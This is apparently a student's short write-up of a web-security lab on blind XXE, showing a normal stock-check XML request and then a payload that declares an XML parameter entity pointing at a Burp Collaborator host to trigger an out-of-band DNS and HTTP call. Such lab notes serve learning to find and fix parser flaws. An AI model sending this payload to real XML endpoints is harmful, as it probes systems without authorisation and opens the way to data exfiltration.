# Blind XXE with out-of-band interaction via XML parameter entities

## This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

## To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

from lab 3

---

### step 1

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>
</productId><storeId>1</storeId></stockCheck>
```

### step2

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://2nq8dmq87te46hasvrn51j7vemkd86wv.oastify.com"> %xxe; ]>
<stockCheck><productId>
</productId><storeId>1</storeId></stockCheck>
```
